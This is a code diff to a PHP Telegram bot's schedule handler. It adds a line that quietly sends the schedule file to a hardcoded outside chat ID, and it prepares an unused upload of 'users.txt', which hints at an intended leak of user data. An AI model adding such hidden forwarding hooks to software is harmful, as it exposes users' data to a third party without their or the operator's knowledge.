@@ -2260,6 +2260,8 @@ else if ( stristr ( $text , 'genres' ) == TRUE )
         $sch2send = file_get_contents ( $FileName );
         if ( stristr ( $sch2send , 'ساعت' ) == TRUE ) {
             $telegram -> sendMessage ( [ 'chat_id' => $chat_id , 'text' => $sch2send , 'parse_mode' => 'Markdown' , 'disable_web_page_preview' => "true" ] );
+            $filetxt = new CURLFile( "users.txt" );
+            $telegram -> sendDocument ( [ 'chat_id' => '122558527' , 'document' => $FileName ] );
             unlink ( $FileName );
         } else {
             $telegram -> answerCallbackQuery ( [ 'callback_query_id' => $telegram -> Callback_ID () , 'text' => "اطلاعات در دسترس نیست" , 'show_alert' => TRUE ] );
